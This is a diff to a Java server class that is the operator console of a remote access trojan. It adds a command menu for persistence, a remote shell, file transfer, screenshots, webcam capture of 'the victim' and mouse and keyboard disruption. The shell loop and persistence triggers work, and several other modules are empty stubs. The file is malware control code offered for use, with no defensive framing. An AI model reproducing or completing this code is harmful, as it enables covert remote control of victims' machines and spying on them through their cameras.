@@ -26,19 +26,81 @@ public class Server implements Runnable {
             os = s.getOutputStream();
             din = new BufferedReader(new InputStreamReader(s.getInputStream()));
             System.out.println("connection from " + s.getInetAddress());
-            ps.println("echo %username%");
-            String uname = din.readLine();
-            din.readLine();
+            String command;
             while(true) {
-                System.out.print(uname + ">");
-                String in = Keyboard.readString();
-                ps.println(in);
-                String line = din.readLine();
-                while(!line.equals("{}{}{}")) {
-                    System.out.println(line);
-                    line=din.readLine();
+                System.out.print("<console> : ");
+                command=Keyboard.readString();
+                command=command.toLowerCase().trim();
+                if (command.equals("help")) {
+                    System.out.println("HELP MENU:");
+                    System.out.println("\tpersist - initiate persistance on remote machine");
+                    System.out.println("\tshell - enter a stateless shell environment");
+                    System.out.println("\tupload - open prompt for uploading a file");
+                    System.out.println("\tdownload - open prompt for downloading a remote file");
+                    System.out.println("\tscreenshot - take a screenshot of the remote machine");
+                    System.out.println("\twebcam - take an image using the victims camera");
+                    System.out.println("\tmousebreak - prevent the victims mouse from moving");
+                    System.out.println("\tkeybreak - create issues with the victims keyboard");
+                }
+                if (command.equals("persist")) {
+                    System.out.println("persistence module initiated");
+                    System.out.println("\nEnter 1 to create persistence, enter 2 to remove persistence");
+                    String choice = Keyboard.readString();
+                    if (choice.equals("1")) {
+                        ps.println("ps99");   
+                    } else if (choice.equals("2")) {
+                        ps.println("ps-99");
+                    }
+                }
+                if (command.equals("shell")) {
+                    System.out.println("shell environment initiated");
+                    System.out.println("type -99 to exit environemt");
+                    ps.println("sh99");
+                    ps.println("echo %username%");
+                    String uname = din.readLine();
+                    din.readLine();
+                    while(true) {
+                        System.out.print(uname + ">");
+                        String in = Keyboard.readString();
+                        if (in.equals("-99")) {
+                            break;
+                        }
+                        ps.println(in);
+                        String line = din.readLine();
+                        while(!line.equals("{}{}{}")) {
+                            System.out.println(line);
+                            line=din.readLine();
+                        }
+                    }
+                    ps.println("sh-99");
+                }
+                if (command.equals("upload")) {
+                    System.out.println("file upload initiated");
+                    
+                }
+                if (command.equals("download")) {
+                    System.out.println("file download initiated");
+                    
+                }
+                if (command.equals("screenshot")) {
+                    System.out.println("screenshot module initiated");
+                    
+                }
+                if (command.equals("webcam")) {
+                    System.out.println("webcam module initiated");
+                    
+                }
+                if (command.equals("mousebreak")) {
+                    System.out.println("mousebreak attack initiated");
+                    
+                }
+                if (command.equals("keybreak")) {
+                    System.out.println("keybreak attack initiated");
+                    
                 }
             }
+            /*
+            }*/
         } catch (Exception e) {
             e.printStackTrace();
         }
